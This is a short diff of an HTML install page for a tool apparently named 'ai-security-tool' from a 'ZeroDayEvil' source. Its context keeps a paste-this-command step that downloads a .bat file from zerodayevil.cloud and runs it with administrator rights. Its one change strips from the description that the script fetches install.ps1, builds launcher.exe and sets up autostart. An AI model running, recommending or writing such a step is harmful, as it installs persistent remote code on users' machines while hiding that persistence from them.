@@ -293,7 +293,7 @@ wget -qO- https://raw.githubusercontent.com/ZeroDayEvil/ai-security-tool/main/sc
 <p><strong>Windows PowerShell</strong> (Run as administrator):</p>
 <pre><code class="language-powershell">iwr "https://zerodayevil.cloud/one-line-web.bat" -OutFile "$env:USERPROFILE\Desktop\one-line-web.bat"
 cmd /c "%USERPROFILE%\Desktop\one-line-web.bat"</code></pre>
-<p>The script installs Go, Python, and Node.js, extracts the archive, downloads <code>install.ps1</code>, builds <code>launcher.exe</code>, and configures autostart. No extra commands are required.</p>
+<p>The script installs Go, Python, and Node.js, extracts the archive. No extra commands are required.</p>
 
 
   <h3>🛠 Build from Source</h3>
